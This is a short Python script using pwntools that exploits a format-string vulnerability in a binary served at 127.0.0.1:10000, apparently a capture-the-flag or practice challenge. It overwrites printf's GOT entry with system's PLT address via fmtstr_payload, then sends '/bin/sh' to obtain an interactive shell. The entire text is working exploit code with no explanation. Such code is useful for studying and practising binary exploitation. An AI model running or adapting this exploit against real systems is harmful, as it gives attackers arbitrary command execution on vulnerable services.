from pwn import *
context.log_level = 'debug'
#io = process('./fmt')
io = remote('127.0.0.1',10000)
elf = ELF('./pwn')
offset = 6 
printf_got = elf.got['printf']
system_plt = elf.plt['system']
payload = fmtstr_payload(offset,{printf_got:system_plt})
io.sendline(payload)
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()
